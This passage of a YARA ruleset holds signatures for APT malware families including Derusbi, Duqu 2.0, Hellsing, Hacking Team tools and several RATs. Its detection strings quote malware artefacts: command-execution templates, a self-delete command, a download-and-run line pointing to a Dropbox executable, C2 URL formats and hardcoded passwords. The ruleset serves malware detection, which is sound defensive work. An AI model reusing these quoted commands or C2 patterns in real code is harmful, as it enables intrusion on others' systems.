		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		super_rule = 1
		hash1 = "13bce64b3b5bdfd24dc6f786b5bee08082ea736be6536ef54f9c908fd1d00f75"
		hash2 = "b631553421aa17171cc47248adc110ca2e79eff44b5e5b0234d69b30cab104e3"
		hash3 = "bc0b885cddf80755c67072c8b5961f7f0adcaeb67a1a5c6b3475614fd51696fe"
	strings:
		$s0 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost" fullword ascii
		$s1 = "regsvr32.exe /s \"%s\"" fullword ascii
		$s2 = "Help and Support" fullword ascii
		$s3 = "netsvcs" fullword ascii
		$s9 = "%SystemRoot%\\System32\\svchost.exe -k netsvcs" fullword ascii /* Goodware String - occured 4 times */
		$s10 = "winlogon" fullword ascii /* Goodware String - occured 4 times */
		$s11 = "System\\CurrentControlSet\\Services" fullword ascii /* Goodware String - occured 11 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 907KB and all of them
}
rule Codoso_PGV_PVID_1 {
	meta:
		description = "Detects Codoso APT PGV PVID Malware"
		author = "Florian Roth"
		reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
		date = "2016-01-30"
		super_rule = 1
		hash1 = "41a936b0d1fd90dffb2f6d0bcaf4ad0536f93ca7591f7b75b0cd1af8804d0824"
		hash2 = "58334eb7fed37e3104d8235d918aa5b7856f33ea52a74cf90a5ef5542a404ac3"
		hash3 = "934b87ddceabb2063b5e5bc4f964628fe0c63b63bb2346b105ece19915384fc7"
		hash4 = "ce91ea20aa2e6af79508dd0a40ab0981f463b4d2714de55e66d228c579578266"
		hash5 = "e770a298ae819bba1c70d0c9a2e02e4680d3cdba22d558d21caaa74e3970adf1"
	strings:
		$x1 = "Cookie: pgv_pvid=" ascii
		$x2 = "DRIVERS\\ipinip.sys" fullword wide

		$s1 = "TsWorkSpaces.dll" fullword ascii
		$s2 = "%SystemRoot%\\System32\\wiaservc.dll" fullword wide
		$s3 = "/selfservice/microsites/search.php?%016I64d" fullword ascii
		$s4 = "/solutions/company-size/smb/index.htm?%016I64d" fullword ascii
		$s5 = "Microsoft Chart ActiveX Control" fullword wide
		$s6 = "MSChartCtrl.ocx" fullword wide
		$s7 = "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}" fullword ascii
		$s8 = "WUServiceMain" fullword ascii /* Goodware String - occured 2 times */
	condition:
		( uint16(0) == 0x5a4d and ( 1 of ($x*) or 3 of them ) ) or
		5 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule Flash_CVE_2015_5119_APT3 {
    meta:
        description = "Exploit Sample CVE-2015-5119"
        author = "Florian Roth"
        score = 70
        yaraexchange = "No distribution without author's consent" 
        date = "2015-08-01"
    strings:
        $s0 = "HT_exploit" fullword ascii
        $s1 = "HT_Exploit" fullword ascii
        $s2 = "flash_exploit_" ascii
        $s3 = "exp1_fla/MainTimeline" ascii fullword
        $s4 = "exp2_fla/MainTimeline" ascii fullword
        $s5 = "_shellcode_32" fullword ascii
        $s6 = "todo: unknown 32-bit target" fullword ascii 
    condition:
        uint16(0) == 0x5746 and 1 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

import "pe"

rule APT_DeputyDog_Fexel
{
meta:
	author = "ThreatConnect Intelligence Research Team"
strings:
	$180 = "180.150.228.102" wide ascii
	$0808cmd = {25 30 38 78 30 38 78 00 5C 00 63 00 6D 00 64 00 2E 00 65 00 78 00 65 [2-6] 43 00 61 00 6E 00 27 00 74 00 20 00 6F 00 70 00 65 00 6E 00 20 00 73 00 68 00 65 00 6C 00 6C 00 21}
	$cUp = "Upload failed! [Remote error code:" nocase wide ascii
	$DGGYDSYRL = {00 44 47 47 59 44 53 59 52 4C 00}
	$GDGSYDLYR = "GDGSYDLYR_%" wide ascii
condition:
	any of them
}

rule APT_DeputyDog
{
    meta:
        Author      = "FireEye Labs"
        Date        = "2013/09/21"
        Description = "detects string seen in samples used in 2013-3893 0day attacks"
        Reference   = "https://www.fireeye.com/blog/threat-research/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html"

    strings:
        $mz = {4d 5a}
        $a = "DGGYDSYRL"

    condition:
        ($mz at 0) and $a
}/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Trojan_Derusbi {
    meta:
        Author = "RSA_IR"
        Date     = "4Sept13"
        File     = "derusbi_variants v 1.3"
        MD5      = " c0d4c5b669cc5b51862db37e972d31ec "

    strings:
        $b1 = {8b 15 ?? ?? ?? ?? 8b ce d3 ea 83 c6 ?? 30 90 ?? ?? ?? ?? 40 3b 05 ?? ?? ?? ?? 72 ??}
        $b2 = {F3 5D 88 2E ?? ?? 00 00 BE 07 18 2E F0 5D 88 2E F7 5D 88 2E 0C A2 88 2E 4B 5D 88 2E F3 5D 88 2E}
        $b3 = {4E E6 40 BB}
        $b4 = {B1 19 BF 44}
        $b5 = {6A F5 44 3D ?? ?? 00 00 27 AF D4 3D 69 F5 44 3D 6E F5 44 3D 95 0A 44 3D D2 F5 44 3D 6A F5 44 3D}
        $b6 = {F3 5D 88 2E ?? ?? 00 00 BE 07 18 2E F0 5D 88 2E}
        $b7 = {D6 D5 A4 A3 ?? ?? 00 00 9B 8F 34 A3 D5 D5 A4 A3 D2 D5 A4 A3 29 2A A4 A3}
        $b8 = {C3 76 33 9F ?? ?? 00 00 8E 2C A3 9F C0 76 33 9F C7 76 33 9F 3C 89 33 9F}

    condition:
        2 of ($b1, $b2, $b3, $b4) and 1 of ($b5, $b6, $b7, $b8)
}

rule APT_Derusbi_DeepPanda
{
meta:
	author = "ThreatConnect Intelligence Research Team"
	reference = "http://www.crowdstrike.com/sites/default/files/AdversaryIntelligenceReport_DeepPanda_0.pdf"
strings:
	$D = "Dom4!nUserP4ss" wide ascii
condition:
	$D
}


rule APT_Derusbi_Gen
{
meta:
	author = "ThreatConnect Intelligence Research Team"
strings:
	$2 = "273ce6-b29f-90d618c0" wide ascii
	$A = "Ace123dx" fullword wide ascii
	$A1 = "Ace123dxl!" fullword wide ascii
	$A2 = "Ace123dx!@#x" fullword wide ascii
	$C = "/Catelog/login1.asp" wide ascii
	$DF = "~DFTMP$$$$$.1" wide ascii
	$G = "GET /Query.asp?loginid=" wide ascii
	$L = "LoadConfigFromReg failded" wide ascii
	$L1 = "LoadConfigFromBuildin success" wide ascii
	$ph = "/photoe/photo.asp HTTP" wide ascii
	$PO = "POST /photos/photo.asp" wide ascii
	$PC = "PCC_IDENT" wide ascii
condition:
	any of them
}
/*
	Yara Rule Set
	Author: Airbus Defence and Space Cybersecurity CSIRT - Fabien Perigaud
	Date: 2015-12-09
   Reference = http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family
	Identifier: Derusbi Dez 2015
*/

rule derusbi_kernel
{
    meta:
        description = "Derusbi Driver version"
        date = "2015-12-09"
        author = "Airbus Defence and Space Cybersecurity CSIRT - Fabien Perigaud"
    strings:
        $token1 = "$$$--Hello"
        $token2 = "Wrod--$$$"
        $cfg = "XXXXXXXXXXXXXXX"
        $class = ".?AVPCC_BASEMOD@@"
        $MZ = "MZ"
    condition:
        $MZ at 0 and $token1 and $token2 and $cfg and $class
}

rule derusbi_linux
{
    meta:
        description = "Derusbi Server Linux version"
        date = "2015-12-09"
        author = "Airbus Defence and Space Cybersecurity CSIRT - Fabien Perigaud"
    strings:
        $PS1 = "PS1=RK# \\u@\\h:\\w \\$"
        $cmd = "unset LS_OPTIONS;uname -a"
        $pname = "[diskio]"
        $rkfile = "/tmp/.secure"
        $ELF = "\x7fELF"
    condition:
        $ELF at 0 and $PS1 and $cmd and $pname and $rkfile
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-12-15
	Identifier: Derusbi Dez 2015
*/

rule Derusbi_Kernel_Driver_WD_UDFS {
	meta:
		description = "Detects Derusbi Kernel Driver"
		author = "Florian Roth"
		reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
		date = "2015-12-15"
		score = 80
		hash1 = "1b449121300b0188ff9f6a8c399fb818d0cf53fd36cf012e6908a2665a27f016"
		hash2 = "50174311e524b97ea5cb4f3ea571dd477d1f0eee06cd3ed73af39a15f3e6484a"
		hash3 = "6cdb65dbfb2c236b6d149fd9836cb484d0608ea082cf5bd88edde31ad11a0d58"
		hash4 = "e27fb16dce7fff714f4b05f2cef53e1919a34d7ec0e595f2eaa155861a213e59"
	strings:
      $x1 = "\\\\.\\pipe\\usbpcex%d" fullword wide
      $x2 = "\\\\.\\pipe\\usbpcg%d" fullword wide
      $x3 = "\\??\\pipe\\usbpcex%d" fullword wide
		$x4 = "\\??\\pipe\\usbpcg%d" fullword wide
      $x5 = "$$$--Hello" fullword ascii
      $x6 = "Wrod--$$$" fullword ascii

		$s1 = "\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword wide
		$s2 = "Update.dll" fullword ascii
		$s3 = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\WMI" fullword wide
		$s4 = "\\Driver\\nsiproxy" fullword wide
		$s5 = "HOST: %s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and
      (
         2 of ($x*) or all of ($s*)
      )
}

rule Derusbi_Code_Signing_Cert {
	meta:
		description = "Detects an executable signed with a certificate also used for Derusbi Trojan - suspicious"
		author = "Florian Roth"
		reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
		date = "2015-12-15"
		score = 40
   strings:
      $s1 = "Fuqing Dawu Technology Co.,Ltd.0" fullword ascii
      $s2 = "XL Games Co.,Ltd.0" fullword ascii
      $s3 = "Wemade Entertainment co.,Ltd0" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and 1 of them
}

rule XOR_4byte_Key {
	meta:
		description = "Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)"
		author = "Florian Roth"
		reference = "http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family"
		date = "2015-12-15"
		score = 60
   strings:
      /* Op Code */
      $s1 = { 85 C9 74 0A 31 06 01 1E 83 C6 04 49 EB F2 }
      /*
      test    ecx, ecx
      jz      short loc_590170
      xor     [esi], eax
      add     [esi], ebx
      add     esi, 4
      dec     ecx
      jmp     short loc_590162
      */
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

rule apt_duqu2_loaders {

meta:
	copyright = "Kaspersky Lab"
	description = "Rule to detect Duqu 2.0 samples"
	last_modified = "2015-06-09"
	version = "1.0"

strings:
	$a1="{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}" wide
	$a2="\\\\.\\pipe\\{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}" wide
	$a4="\\\\.\\pipe\\{AB6172ED-8105-4996-9D2A-597B5F827501}" wide
	$a5="Global\\{B54E3268-DE1E-4c1e-A667-2596751403AD}" wide
	$a8="SELECT `Data` FROM `Binary` WHERE `Name`=’%s%i'" wide
	$a9="SELECT `Data` FROM `Binary` WHERE `Name`=’CryptHash%i'" wide
	$a7="SELECT `%s` FROM `%s` WHERE `%s`=’CAData%i'" wide
	
	$b1="MSI.dll"
	$b2="msi.dll"
	$b3="StartAction"

	$c1="msisvc_32@" wide
	$c2="PROP=" wide
	$c3="-Embedding" wide
	$c4="S:(ML;;NW;;;LW)" wide

	$d1 = "NameTypeBinaryDataCustomActionActionSourceTargetInstallExecuteSequenceConditionSequencePropertyValueMicrosoftManufacturer" nocase
	$d2 = {2E 3F 41 56 3F 24 5F 42 69 6E 64 40 24 30 30 58 55 3F 24 5F 50 6D 66 5F 77 72 61 70 40 50 38 43 4C 52 ?? 40 40 41 45 58 58 5A 58 56 31 40 24 24 24 56 40 73 74 64 40 40 51 41 56 43 4C 52 ?? 40 40 40 73 74 64 40 40}

condition:
	( (uint16(0) == 0x5a4d) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) ) and filesize < 100000 )

	or 

	( (uint32(0) == 0xe011cfd0) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) or (any of ($d*)) ) and filesize < 20000000 )
}


rule apt_duqu2_drivers {

meta:
	copyright = "Kaspersky Lab"
	description = "Rule to detect Duqu 2.0 drivers"
	last_modified = "2015-06-09"
	version = "1.0"

strings:
	$a1="\\DosDevices\\port_optimizer" wide nocase
	$a2="romanian.antihacker"
	$a3="PortOptimizerTermSrv" wide
	$a4="ugly.gorilla1"

	$b1="NdisIMCopySendCompletePerPacketInfo"
	$b2="NdisReEnumerateProtocolBindings"
	$b3="NdisOpenProtocolConfiguration"

condition:
	uint16(0) == 0x5A4D and (any of ($a*) ) and (2 of ($b*)) and filesize < 100000
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-01-02
	Identifier: Emissary Malware
*/

rule Emissary_APT_Malware_1 {
	meta:
		description = "Detect Emissary Malware - from samples A08E81B411.DAT, ishelp.dll"
		author = "Florian Roth"
		reference = "http://goo.gl/V0epcf"
		date = "2016-01-02"
		score = 75
		hash1 = "9420017390c598ee535c24f7bcbd39f40eca699d6c94dc35bcf59ddf918c59ab"
		hash2 = "70561f58c9e5868f44169854bcc906001947d98d15e9b4d2fbabd1262d938629"
		hash3 = "0e64e68f6f88b25530699a1cd12f6f2790ea98e6e8fa3b4bc279f8e5c09d7290"
		hash4 = "69caa2a4070559d4cafdf79020c4356c721088eb22398a8740dea8d21ae6e664"
		hash5 = "675869fac21a94c8f470765bc6dd15b17cc4492dd639b878f241a45b2c3890fc"
		hash6 = "e817610b62ccd00bdfc9129f947ac7d078d97525e9628a3aa61027396dba419b"
		hash7 = "a8b0d084949c4f289beb4950f801bf99588d1b05f68587b245a31e8e82f7a1b8"
		hash8 = "acf7dc5a10b00f0aac102ecd9d87cd94f08a37b2726cb1e16948875751d04cc9"
		hash9 = "e21b47dfa9e250f49a3ab327b7444902e545bed3c4dcfa5e2e990af20593af6d"
		hash10 = "e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538"
		hash11 = "29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051"
		hash12 = "98fb1d2975babc18624e3922406545458642e01360746870deee397df93f50e0"
		hash13 = "fbcb401cf06326ab4bb53fb9f01f1ca647f16f926811ea66984f1a1b8cf2f7bb"
	strings:
		$s1 = "cmd.exe /c %s > %s" fullword ascii
		$s2 = "execute cmd timeout." fullword ascii
		$s3 = "rundll32.exe \"%s\",Setting" fullword ascii
		$s4 = "DownloadFile - exception:%s." fullword ascii
		$s5 = "CDllApp::InitInstance() - Evnet create successful." fullword ascii
		$s6 = "UploadFile - EncryptBuffer Error" fullword ascii
		$s7 = "WinDLL.dll" fullword wide
		$s8 = "DownloadFile - exception:%s,code:0x%08x." fullword ascii
		$s9 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" fullword ascii
		$s10 = "CDllApp::InitInstance() - Evnet already exists." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and 3 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

rule bin_ndisk {
	meta:
		description = "Hacking Team Disclosure Sample - file ndisk.sys"
		author = "Florian Roth"
		reference = "https://www.virustotal.com/en/file/a03a6ed90b89945a992a8c69f716ec3c743fa1d958426f4c50378cca5bef0a01/analysis/1436184181/"
		date = "2015-07-07"
		hash = "cf5089752ba51ae827971272a5b761a4ab0acd84"
	strings:
		$s1 = "\\Registry\\Machine\\System\\ControlSet00%d\\services\\ndisk.sys" fullword wide 
		$s2 = "\\Registry\\Machine\\System\\ControlSet00%d\\Enum\\Root\\LEGACY_NDISK.SYS" fullword wide 
		$s3 = "\\Driver\\DeepFrz" fullword wide
		$s4 = "Microsoft Kernel Disk Manager" fullword wide 
		$s5 = "ndisk.sys" fullword wide
		$s6 = "\\Device\\MSH4DEV1" fullword wide
		$s7 = "\\DosDevices\\MSH4DEV1" fullword wide
		$s8 = "built by: WinDDK" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and 6 of them
}

rule Hackingteam_Elevator_DLL {
	meta:
		description = "Hacking Team Disclosure Sample - file elevator.dll"
		author = "Florian Roth"
		reference = "http://t.co/EG0qtVcKLh"
		date = "2015-07-07"
		hash = "b7ec5d36ca702cc9690ac7279fd4fea28d8bd060"
	strings:
		$s1 = "\\sysnative\\CI.dll" fullword ascii 
		$s2 = "setx TOR_CONTROL_PASSWORD" fullword ascii 
		$s3 = "mitmproxy0" fullword ascii 
		$s4 = "\\insert_cert.exe" fullword ascii
		$s5 = "elevator.dll" fullword ascii
		$s6 = "CRTDLL.DLL" fullword ascii
		$s7 = "fail adding cert" fullword ascii
		$s8 = "DownloadingFile" fullword ascii 
		$s9 = "fail adding cert: %s" fullword ascii
		$s10 = "InternetOpenA fail" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 6 of them
}

rule HackingTeam_Elevator_EXE {
	meta:
		description = "Hacking Team Disclosure Sample - file elevator.exe"
		author = "Florian Roth"
		reference = "Hacking Team Disclosure elevator.c"
		date = "2015-07-07"
		hash1 = "40a10420b9d49f87527bc0396b19ec29e55e9109e80b52456891243791671c1c"
		hash2 = "92aec56a859679917dffa44bd4ffeb5a8b2ee2894c689abbbcbe07842ec56b8d"
		hash = "9261693b67b6e379ad0e57598602712b8508998c0cb012ca23139212ae0009a1"
	strings:
		$x1 = "CRTDLL.DLL" fullword ascii
		$x2 = "\\sysnative\\CI.dll" fullword ascii
		$x3 = "\\SystemRoot\\system32\\CI.dll" fullword ascii
		$x4 = "C:\\\\Windows\\\\Sysnative\\\\ntoskrnl.exe" fullword ascii /* PEStudio Blacklist: strings */

		$s1 = "[*] traversing processes" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "_getkprocess" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "[*] LoaderConfig %p" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "loader.obj" fullword ascii /* PEStudio Blacklist: strings */
		$s5 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3" ascii /* PEStudio Blacklist: strings */
		$s6 = "[*] token restore" fullword ascii /* PEStudio Blacklist: strings */
		$s7 = "elevator.obj" fullword ascii
		$s8 = "_getexport" fullword ascii /* PEStudio Blacklist: strings */
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of ($x*) and 3 of ($s*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as long as you use it under this license.
*/

import "pe"


rule apt_hellsing_implantstrings : PE
{ 
	meta:
		Author		= "Costin Raiu, Kaspersky Lab"
		Date		= "2015-04-07"
		Description	= "detection for Hellsing implants"
		Reference	= "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"

	strings: 
		$mz="MZ"

		$a1="the file uploaded failed !" 
		$a2="ping 127.0.0.1"
		
		$b1="the file downloaded failed !" 
		$b2="common.asp"
		
		$c="xweber_server.exe" 
		$d="action="

		$debugpath1="d:\\Hellsing\\release\\msger\\" nocase 
		$debugpath2="d:\\hellsing\\sys\\xrat\\" nocase 
		$debugpath3="D:\\Hellsing\\release\\exe\\" nocase 
		$debugpath4="d:\\hellsing\\sys\\xkat\\" nocase 
		$debugpath5="e:\\Hellsing\\release\\clare" nocase 
		$debugpath6="e:\\Hellsing\\release\\irene\\" nocase 
		$debugpath7="d:\\hellsing\\sys\\irene\\" nocase

		$e="msger_server.dll"
		$f="ServiceMain"

	condition:
		($mz at 0) and (all of ($a*)) or (all of ($b*)) or ($c and $d) or (any of ($debugpath*)) or ($e and $f) and filesize < 500000
}

rule apt_hellsing_installer : PE
{
	meta:
		Author		= "Costin Raiu, Kaspersky Lab"
		Date		= "2015-04-07"
		Description	= "detection for Hellsing xweber/msger installers"
		Reference	= "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back" 

	strings: 
		$mz="MZ"
		
		$cmd="cmd.exe /c ping 127.0.0.1 -n 5&cmd.exe /c del /a /f \"%s\""
		
		$a1="xweber_install_uac.exe"
		$a2="system32\\cmd.exe" wide
		$a4="S11SWFOrVwR9UlpWRVZZWAR0U1aoBHFTUl2oU1Y=" 
		$a5="S11SWFOrVwR9dnFTUgRUVlNHWVdXBFpTVgRdUlpWRVZZWARdUqhZVlpFR1kEUVNSXahTVgRaU1YEUVNSXahTVl1SWwRZValdVFFZUqgQBF1SWlZFVllYBFRTVqg=" $a6="7dqm2ODf5N/Y2N/m6+br3dnZpunl44g="
		$a7="vd/m7OXd2ai/5u7a59rr7Ki45drcqMPl5t/c5dqIZw==" 
		$a8="vd/m7OXd2ai/usPl5qjY2uXp69nZqO7l2qjf5u7a59rr7Kjf5tzr2u7n6euo4+Xm39zl2qju5dqo4+Xm39zl2t/m7ajr19vf2OPr39rj5eaZmqbs5OSI Njl2tyI" $a9="C:\\Windows\\System32\\sysprep\\sysprep.exe" wide 
		$a10="%SystemRoot%\\system32\\cmd.exe" wide 
		$a11="msger_install.dll"
		$a12={00 65 78 2E 64 6C 6C 00}

	condition:
		($mz at 0) and ($cmd and (2 of ($a*))) and filesize < 500000
}

rule apt_hellsing_proxytool : PE
{
	meta:
		Author		= "Costin Raiu, Kaspersky Lab"
		Date		= "2015-04-07"
		Description	= "detection for Hellsing proxy testing tool"
		Reference	= "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back" 

	strings: 
		$mz="MZ"
		$a1="PROXY_INFO: automatic proxy url => %s " 
		$a2="PROXY_INFO: connection type => %d " 
		$a3="PROXY_INFO: proxy server => %s " 
		$a4="PROXY_INFO: bypass list => %s " 
		$a5="InternetQueryOption failed with GetLastError() %d" 
		$a6="D:\\Hellsing\\release\\exe\\exe\\" nocase

	condition:
		($mz at 0) and (2 of ($a*)) and filesize < 300000
}

rule apt_hellsing_xkat : PE
{
	meta:
		Author		= "Costin Raiu, Kaspersky Lab"
		Date		= "2015-04-07"
		Description	= "detection for Hellsing xKat tool"
		Reference	= "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"

	strings:
		$mz="MZ"
		$a1="\\Dbgv.sys"
		$a2="XKAT_BIN"
		$a3="release sys file error."
		$a4="driver_load error. "
		$a5="driver_create error."
		$a6="delete file:%s error."
		$a7="delete file:%s ok."
		$a8="kill pid:%d error."
		$a9="kill pid:%d ok."
		$a10="-pid-delete"
		$a11="kill and delete pid:%d error."
		$a12="kill and delete pid:%d ok."

	condition:
		($mz at 0) and (6 of ($a*)) and filesize < 300000
}

rule apt_hellsing_msgertype2 : PE
{
	meta:
		Author		= "Costin Raiu, Kaspersky Lab"
		Date		= "2015-04-07"
		Description	= "detection for Hellsing msger type 2 implants"
		Reference	= "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"

	strings:
		$mz="MZ"
		$a1="%s\\system\\%d.txt"
		$a2="_msger"
		$a3="http://%s/lib/common.asp?action=user_login&uid=%s&lan=%s&host=%s&os=%s&proxy=%s"
		$a4="http://%s/data/%s.1000001000"
		$a5="/lib/common.asp?action=user_upload&file="
		$a6="%02X-%02X-%02X-%02X-%02X-%02X"
	
	condition:
		($mz at 0) and (4 of ($a*)) and filesize < 500000
}

rule apt_hellsing_irene : PE
{
	meta:
		Author		= "Costin Raiu, Kaspersky Lab"
		Date		= "2015-04-07"
		Description	= "detection for Hellsing msger irene installer"
		Reference	= "http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back"

	strings: 
		$mz="MZ"
		$a1="\\Drivers\\usbmgr.tmp" wide
		$a2="\\Drivers\\usbmgr.sys" wide
		$a3="common_loadDriver CreateFile error! " 
		$a4="common_loadDriver StartService error && GetLastError():%d! " 
		$a5="irene" wide
		$a6="aPLib v0.43 - the smaller the better" 

	condition:
		($mz at 0) and (4 of ($a*)) and filesize < 500000
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule APT_Hikit_msrv
{
meta:
	author = "ThreatConnect Intelligence Research Team"
strings:
	$m = {6D 73 72 76 2E 64 6C 6C 00 44 6C 6C}
condition:
	any of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule apt_win32_dll_rat_hiZorRAT
{
	meta:
    description = "Detects hiZor RAT"
		hash1 = "75d3d1f23628122a64a2f1b7ef33f5cf"
		hash2 = "d9821468315ccd3b9ea03161566ef18e"
		hash3 = "b9af5f5fd434a65d7aa1b55f5441c90a"
    ref1 = "http://www.threatgeek.com/2016/01/introducing-hi-zor-rat.html"
    ref2 = "https://github.com/Neo23x0/Loki/blob/b187ed063d73d0defc6958100ca7ad04aa77fc12/signatures/apt_hizor_rat.yar"
    reference = "https://www.fidelissecurity.com/sites/default/files/FTA_1020_Fidelis_Inocnation_FINAL.pdf"
	strings:
		// Part of the encoded User-Agent = Mozilla
		$s1 = { c7 [5] 40 00 62 00 c7 [5] 77 00 64 00 c7 [5] 61 00 61 00 c7 [5] 6c 00 }

		// XOR to decode User-Agent after string stacking 0x10001630
		$s2 = { 66 [7] 0d 40 83 ?? ?? 7c ?? }

		// XOR with 0x2E - 0x10002EF6
		$s3 = { 80 [2] 2e 40 3b ?? 72 ?? }

		$s4 = "CmdProcessExited" wide ascii
		$s5 = "rootDir" wide ascii
		$s6 = "DllRegisterServer" wide ascii
		$s7 = "GetNativeSystemInfo" wide ascii
		$s8 = "%08x%08x%08x%08x" wide ascii
	condition:
		(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-10-01
	Identifier: Indetectables RAT
*/

rule Indetectables_RAT {
	meta:
		description = "Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux"
		author = "Florian Roth"
		reference = "http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/"
		date = "2015-10-01"
		super_rule = 1
		hash1 = "081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105"
		hash2 = "66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229"
		hash3 = "1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801"
	strings:
		$s1 = "Coded By M3" fullword wide
		$s2 = "Stub Undetector M3" fullword wide
		$s3 = "www.webmenegatti.com.br" wide
		$s4 = "M3n3gatt1" fullword wide
		$s5 = "TheMisterFUD" fullword wide
		$s6 = "KillZoneKillZoneKill" fullword ascii
		$s7 = "[[__M3_F_U_D_M3__]]$" fullword ascii
		$s8 = "M3_F_U_D_M3" ascii
		$s9 = "M3n3gatt1hack3r" fullword wide
		$s9 = "M3n3gatt1hack3r" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 5000KB and 1 of them
}

rule BergSilva_Malware {
	meta:
		description = "Detects a malware from the same author as the Indetectables RAT"
		author = "Florian Roth"
		date = "2015-10-01"
		super_rule = 1
		hash1 = "00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e"
		hash2 = "6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc"
	strings:
		$x1 = "C:\\Users\\Berg Silva\\Desktop\\" wide
		$x2 = "URLDownloadToFileA 0, \"https://dl.dropbox.com/u/105015858/nome.exe\", \"c:\\nome.exe\", 0, 0" fullword wide

		$s1 = " Process.Start (Path.GetTempPath() & \"name\" & \".exe\") 'start server baixado" fullword wide
		$s2 = "FileDelete(@TempDir & \"\\nome.exe\") ;Deleta o Arquivo para que possa ser executado normalmente" fullword wide
		$s3 = " Lib \"\\WINDOWS\\system32\\UsEr32.dLl\"" fullword wide
		$s4 = "$Directory = @TempDir & \"\\nome.exe\" ;Define a variavel" fullword wide
		$s5 = "https://dl.dropbox.com/u/105015858" wide
	condition:
		uint16(0) == 0x5a4d and ( 1 of ($x*) or 2 of ($s*) )
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule IronTiger_ASPXSpy
{
	meta:
		author = "Cyber Safety Solutions, Trend Micro"
		description = "ASPXSpy detection. It might be used by other fraudsters"
		reference = "http://goo.gl/T5fSJC"
	strings:
		$str1 = "ASPXSpy" nocase wide ascii
		$str2 = "IIS Spy" nocase wide ascii
